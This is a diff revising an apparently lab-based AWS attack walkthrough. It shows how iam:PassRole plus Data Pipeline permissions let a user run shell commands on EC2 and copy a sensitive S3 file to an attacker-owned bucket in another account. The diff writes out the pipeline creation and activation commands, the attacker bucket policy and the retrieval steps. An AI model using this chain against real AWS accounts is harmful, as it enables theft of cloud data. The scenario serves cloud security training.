@@ -1,22 +1,22 @@
-# Guided Walkthrough: Privilege Escalation via iam:PassRole + Data Pipeline with Resource Policy Bypass
+# Guided Walkthrough: Data Exfiltration via iam:PassRole + Data Pipeline
 
-This scenario demonstrates a sophisticated privilege escalation and data exfiltration technique using AWS Data Pipeline combined with an overly permissive S3 bucket resource policy. An attacker with `iam:PassRole` and Data Pipeline permissions can create a pipeline that executes arbitrary shell commands on EC2 instances, allowing them to access and exfiltrate sensitive S3 data.
+This scenario demonstrates how an attacker with `iam:PassRole` and Data Pipeline permissions can exfiltrate sensitive S3 data they have no direct IAM access to.
 
-The critical vulnerability in this scenario is the combination of two security weaknesses: (1) the ability to pass roles to Data Pipeline and execute arbitrary commands, and (2) an overly permissive bucket resource policy that allows writes from any principal. Even though the pipeline role only has `s3:GetObject` permissions (read-only), the write operation succeeds because the destination bucket's resource policy grants `s3:PutObject` to `Principal: "*"`, effectively bypassing IAM restrictions.
+The critical vulnerability is a single compounding misconfiguration on the victim side: a user holds `iam:PassRole` on a role that has read access to a sensitive S3 bucket, combined with enough Data Pipeline permissions to launch arbitrary shell commands on EC2 instances. By passing that role to Data Pipeline, the attacker runs code as the pipeline role and reads the sensitive data, then ships it to attacker-controlled infrastructure.
 
-This attack pattern is particularly dangerous because it demonstrates how resource policies can override restrictive IAM policies, creating unexpected privilege escalation paths. Security teams often focus on IAM policies while overlooking permissive resource policies, making this a common blind spot in cloud security posture. The scenario highlights the importance of analyzing both IAM and resource-based policies together to identify true access paths.
+The exfiltration bucket is **not** a victim misconfiguration. It is attacker-owned infrastructure, deployed in the attacker's own AWS account before the attack begins. Its bucket policy explicitly grants the victim account permission to write to it — something the attacker controls entirely.
 
 ## The Challenge
 
-You start as `pl-prod-datapipeline-001-to-bucket-starting-user`, an IAM user with credentials provisioned by Terraform. Your permissions include `iam:PassRole` on the pipeline role, the three core Data Pipeline permissions (`CreatePipeline`, `PutPipelineDefinition`, `ActivatePipeline`), and `s3:GetObject` on the exfil bucket.
+You start as `pl-prod-datapipeline-001-to-bucket-starting-user`, an IAM user with credentials provisioned by Terraform. Your permissions include `iam:PassRole` on the pipeline role and the three core Data Pipeline permissions (`CreatePipeline`, `PutPipelineDefinition`, `ActivatePipeline`).
 
-Your goal is to read the contents of `pl-sensitive-data-datapipeline-001-{account_id}-{suffix}` — a bucket you have no direct IAM access to. To reach it, you'll need to pass a role to AWS Data Pipeline, execute a shell command on an EC2 instance, and exploit a misconfigured resource policy on the exfil bucket to complete the data transfer.
+Your goal is to read the contents of `pl-sensitive-data-datapipeline-001-{account_id}-{suffix}` — a bucket you have no direct IAM access to. To reach it, you'll need to pass the pipeline role to AWS Data Pipeline and have it execute a shell command on an EC2 instance that reads and ships the sensitive file to your attacker-controlled exfil bucket.
 
 Key resources:
 - Starting user: `arn:aws:iam::{account_id}:user/pl-prod-datapipeline-001-to-bucket-starting-user`
 - Pipeline role: `arn:aws:iam::{account_id}:role/pl-prod-datapipeline-001-to-bucket-pipeline-role`
-- Sensitive bucket: `arn:aws:s3:::pl-sensitive-data-datapipeline-001-{account_id}-{suffix}`
-- Exfil bucket: `arn:aws:s3:::pl-exfil-bucket-datapipeline-001-{account_id}-{suffix}`
+- Sensitive bucket (target): `arn:aws:s3:::pl-sensitive-data-datapipeline-001-{account_id}-{suffix}`
+- Exfil bucket (attacker-controlled): `arn:aws:s3:::pl-exfil-bucket-datapipeline-001-{attacker_account_id}-{suffix}`
 
 ## Reconnaissance
 
@@ -30,30 +30,30 @@ aws s3 cp s3://pl-sensitive-data-datapipeline-001-123456789012-abc123/secret-dat
 # An error occurred (AccessDenied) ...
 ```
 
-Good — you can't read the sensitive bucket directly. Now look at the pipeline role's effective permissions. The role has `s3:GetObject` on the sensitive bucket, but no `s3:PutObject` anywhere in its IAM policies.
-
-Now check the exfil bucket policy:
+Good — you can't read the sensitive bucket directly. Now check what the pipeline role can do. Enumerate its policy:
 
 ```bash
-aws s3api get-bucket-policy --bucket pl-exfil-bucket-datapipeline-001-123456789012-abc123
+aws iam get-role-policy \
+    --role-name pl-prod-datapipeline-001-to-bucket-pipeline-role \
+    --policy-name pl-prod-datapipeline-001-to-bucket-pipeline-policy
 ```
 
-The resource policy reveals the critical misconfiguration:
+The role has `s3:GetObject` and `s3:ListBucket` on the sensitive bucket. Any EC2 instance running as this role can read from it. Before launching the pipeline, stage your exfil bucket in your own AWS account and set a resource policy that grants the victim account write access:
 
 ```json
 {
   "Effect": "Allow",
-  "Principal": "*",
+  "Principal": { "AWS": "arn:aws:iam::VICTIM_ACCOUNT_ID:root" },
   "Action": "s3:PutObject",
-  "Resource": "arn:aws:s3:::pl-exfil-bucket-datapipeline-001-123456789012-abc123/*"
+  "Resource": "arn:aws:s3:::pl-exfil-bucket-datapipeline-001-ATTACKER_ACCOUNT-SUFFIX/*"
 }
 ```
 
-Any AWS principal can write to this bucket — including the EC2 instance the pipeline will spin up. The IAM policy for the pipeline role says "no write access," but the bucket resource policy overrides that with an unconditional allow.
+(In this lab, the exfil bucket is pre-staged by Terraform in the attacker account.)
 
 ## Exploitation
 
-With the resource policy bypass confirmed, the attack chain is clear: create a Data Pipeline that passes the read-only role to an EC2 instance, have that instance copy the sensitive file to the exfil bucket, then retrieve it yourself.
+With the pipeline role's read access confirmed and your exfil bucket ready, create a Data Pipeline that passes the role to an EC2 instance and runs the exfiltration command.
 
 ### Step 1: Create the pipeline
 
@@ -70,12 +70,12 @@ echo "Pipeline ID: $PIPELINE_ID"
 
 ### Step 2: Define the pipeline with a ShellCommandActivity
 
-Create the pipeline definition JSON. The key parts are the `role` and `resourceRole` (both pointing at the pipeline role), and the `command` in the `ShellCommandActivity` that performs the exfiltration:
+Create the pipeline definition JSON. The `role` and `resourceRole` both point at the pipeline role. The `command` in the `ShellCommandActivity` performs the exfiltration cross-account:
 
 ```bash
 PIPELINE_ROLE_ARN="arn:aws:iam::123456789012:role/pl-prod-datapipeline-001-to-bucket-pipeline-role"
 SENSITIVE_BUCKET="pl-sensitive-data-datapipeline-001-123456789012-abc123"
-EXFIL_BUCKET="pl-exfil-bucket-datapipeline-001-123456789012-abc123"
+EXFIL_BUCKET="pl-exfil-bucket-datapipeline-001-ATTACKER_ACCOUNT-abc123"
 
 cat > /tmp/pipeline_definition.json << EOF
 {
@@ -123,15 +123,18 @@ aws datapipeline activate-pipeline \
     --pipeline-id "$PIPELINE_ID"
 ```
 
-Data Pipeline will now launch a `t3.micro` EC2 instance running as the pipeline role. The instance will execute the `aws s3 cp` command. The read from the sensitive bucket succeeds via IAM (`s3:GetObject` is allowed). The write to the exfil bucket also succeeds — not through IAM (the role has no write permission), but through the bucket's `Principal: "*"` resource policy.
+Data Pipeline launches a `t3.micro` EC2 instance running as the pipeline role. The instance executes the `aws s3 cp` command. The read from the sensitive bucket succeeds via IAM (`s3:GetObject` is allowed on the pipeline role). The cross-account write to the exfil bucket succeeds because the attacker-controlled bucket's resource policy explicitly grants the victim account write access.
 
 Wait approximately 60-90 seconds for the EC2 instance to launch and the shell command to complete.
 
 ## Verification
 
-Once the pipeline has had time to execute, confirm the exfiltrated data is present and readable by your starting user:
+Once the pipeline has had time to execute, use your attacker-account credentials to confirm the exfiltrated data is present:
 
 ```bash
+# Switch to attacker-account credentials
+export AWS_PROFILE=attacker-account
+
 # Check the exfil bucket for the output file
 aws s3 ls s3://$EXFIL_BUCKET/exfiltrated.txt --region us-east-1
 
@@ -139,10 +142,12 @@ aws s3 ls s3://$EXFIL_BUCKET/exfiltrated.txt --region us-east-1
 aws s3 cp s3://$EXFIL_BUCKET/exfiltrated.txt - --region us-east-1
 ```
 
-You should see the contents of `secret-data.txt` from the sensitive bucket. Bucket access achieved.
+You should see the contents of `secret-data.txt` from the sensitive bucket. Data exfiltrated.
 
 ## What Happened
 
-The attack succeeded because of a compounding misconfiguration: a user with `iam:PassRole` could inject any role into a compute service (Data Pipeline), which then ran arbitrary shell commands on an EC2 instance. The pipeline role itself was correctly scoped to read-only IAM access on the sensitive bucket — but the exfil bucket's resource policy opened a write path to the entire world (`Principal: "*"`), bypassing the role's IAM restrictions entirely.
+The attack succeeded because of a single compounding misconfiguration on the victim side: the starting user held `iam:PassRole` on a role that had read access to a sensitive S3 bucket, combined with enough Data Pipeline permissions to run arbitrary shell commands on EC2 instances. That combination let the attacker reach data they had no direct IAM access to.
 
-This is the core lesson of resource policy bypass vulnerabilities. IAM policies and resource policies are evaluated together by AWS, but they operate independently. A bucket policy that grants access to `Principal: "*"` will allow any authenticated AWS principal to write to that bucket, regardless of what their IAM policies say. Security reviews that only audit IAM policies without also reviewing resource policies will miss this class of vulnerability.
+The exfil bucket is entirely attacker-controlled. The attacker staged it in their own account before the attack and configured it to accept writes from the victim account. This is standard attacker tradecraft — not a victim misconfiguration. Security reviews of the victim environment will find no misconfigured bucket on the victim side; the issue is entirely in the IAM permission set of the starting user and pipeline role.
+
+The key lesson: `iam:PassRole` on a role that has access to sensitive data, combined with any compute service creation permission, is a data exfiltration path. The attacker does not need to escalate to admin; they only need to run code as the role.
